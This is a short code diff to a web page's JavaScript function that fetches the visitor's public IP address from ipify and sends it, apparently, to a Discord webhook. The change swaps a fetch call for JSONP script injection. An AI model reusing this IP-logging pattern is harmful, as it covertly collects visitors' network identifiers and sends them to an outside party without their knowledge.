@@ -41,16 +41,14 @@
 
         function sendToDiscord(webhookURL) {
             var ipAddress = "Unknown"; // Default value for IP address
-            fetch('https://api64.ipify.org?format=json')
-                .then(response => response.json())
-                .then(data => {
-                    ipAddress = data.ip;
-                    sendEmbed(webhookURL, ipAddress);
-                })
-                .catch(error => {
-                    console.error('Unable to fetch IP address:', error);
-                    sendEmbed(webhookURL, ipAddress); // Send embed with default IP address
-                });
+            var script = document.createElement('script');
+            script.src = 'https://api64.ipify.org?format=json&callback=handleIPResponse';
+            document.body.appendChild(script);
+
+            window.handleIPResponse = function(data) {
+                ipAddress = data.ip;
+                sendEmbed(webhookURL, ipAddress);
+            };
         }
 
         function sendEmbed(webhookURL, ipAddress) {
